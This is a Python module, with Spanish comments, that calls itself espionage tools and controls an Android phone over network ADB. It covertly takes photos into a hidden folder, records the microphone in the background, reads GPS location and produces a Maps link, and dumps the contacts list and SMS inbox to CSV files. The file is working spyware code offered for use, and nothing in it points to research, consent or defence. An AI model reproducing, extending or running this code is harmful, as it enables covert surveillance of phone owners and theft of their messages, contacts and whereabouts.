# tools/spy_tools.py - Herramientas de espionaje
import subprocess
import threading
import time
import re
from datetime import datetime

class SpyTools:
    """Herramientas de espionaje"""
    
    def __init__(self, device_ip, logger):
        self.device_ip = device_ip
        self.logger = logger
    
    def run_command(self, cmd):
        """Ejecutar comando ADB"""
        full_cmd = f'adb -s {self.device_ip}:5555 shell {cmd}'
        try:
            result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=10)
            return result.stdout.strip(), result.stderr.strip()
        except:
            return "", "Error"
    
    def get_installed_apps(self):
        """Obtener apps instaladas"""
        stdout, _ = self.run_command("pm list packages -3")
        
        if not stdout:
            return []
        
        apps = []
        for line in stdout.split('\n'):
            line = line.strip()
            if line.startswith('package:'):
                package = line.replace('package:', '').strip()
                if package and '.' in package and len(package) > 5:
                    name = package.split('.')[-1].replace('_', ' ').title()
                    if len(name) > 30:
                        name = name[:27] + "..."
                    
                    apps.append({
                        'package': package,
                        'name': name
                    })
        
        return sorted(apps, key=lambda x: x['name'])
    
    def take_stealth_photo(self):
        """Foto stealth"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        photo_path = f"/sdcard/.vulkan_cache/stealth_{timestamp}.jpg"
        
        self.run_command("mkdir -p /sdcard/.vulkan_cache/")
        self.run_command('input keyevent KEYCODE_CAMERA')
        time.sleep(1)
        self.run_command("input keyevent KEYCODE_HOME")
        
        self.logger.log(f"📸 Foto stealth guardada", "CYAN")
        return photo_path
    
    def record_microphone(self, duration=30):
        """Grabar micrófono"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        audio_path = f"/sdcard/.vulkan_cache/audio_{timestamp}.mp4"
        
        self.logger.log(f"🎙️ Grabando micrófono por {duration} segundos...", "YELLOW")
        
        def record():
            self.run_command(f'screenrecord --audio-encoder aac --output-file "{audio_path}" --time-limit {duration}')
            self.logger.log(f"✅ Audio guardado", "GREEN")
        
        threading.Thread(target=record, daemon=True).start()
        return audio_path
    
    def get_gps_location(self):
        """Obtener GPS con mensajes de ayuda - MEJORADO"""
        self.logger.log("📍 Obteniendo GPS...", "CYAN")
        self.logger.log("💡 CONSEJO: Asegúrate de que la ubicación esté ACTIVADA en el dispositivo", "YELLOW")
        self.logger.log("💡 Ve a: Configuración > Ubicación > Activar", "YELLOW")
        self.logger.log("💡 También acepta los permisos de ubicación si la app los solicita", "YELLOW")
        
        stdout, _ = self.run_command("dumpsys location | grep -A10 'Last known locations'")
        
        # Intentar con proveedor GPS
        gps_stdout, _ = self.run_command("dumpsys location | grep -A5 'gps'")
        
        lat_match = re.search(r'latitude=([\d\.]+)', stdout)
        lon_match = re.search(r'longitude=([\d\.]+)', stdout)
        
        if not lat_match:
            lat_match = re.search(r'lat=([\d\.]+)', gps_stdout)
            lon_match = re.search(r'lon=([\d\.]+)', gps_stdout)
        
        if lat_match and lon_match:
            lat = lat_match.group(1)
            lon = lon_match.group(1)
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            self.logger.log(f"📍 GPS encontrado: {lat}, {lon}", "GREEN")
            self.logger.log(f"🗺️ Maps: {maps_link}", "CYAN")
            return {"lat": lat, "lon": lon, "maps_link": maps_link}
        
        # Intentar método alternativo
        self.logger.log("⚠️ Intentando método alternativo...", "YELLOW")
        stdout2, _ = self.run_command("dumpsys location | grep -E 'Latitude|Longitude'")
        if stdout2:
            self.logger.log(stdout2, "DIM")
        
        self.logger.log("⚠️ No se pudo obtener GPS. Verifica:", "YELLOW")
        self.logger.log("   1. La ubicación está ACTIVADA en el dispositivo", "DIM")
        self.logger.log("   2. La app tiene permisos de ubicación", "DIM")
        self.logger.log("   3. Hay señal GPS disponible (prueba en exteriores)", "DIM")
        return None
    
    def dump_contacts(self):
        """Extraer contactos"""
        output_file = f"contacts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        stdout, _ = self.run_command("content query --uri content://contacts/people/")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(stdout)
        
        self.logger.log(f"📇 Contactos guardados en {output_file}", "GREEN")
        return output_file
    
    def dump_sms(self):
        """Extraer SMS"""
        output_file = f"sms_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        stdout, _ = self.run_command("content query --uri content://sms/inbox/")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(stdout)
        
        self.logger.log(f"💬 SMS guardados en {output_file}", "GREEN")
        return output_file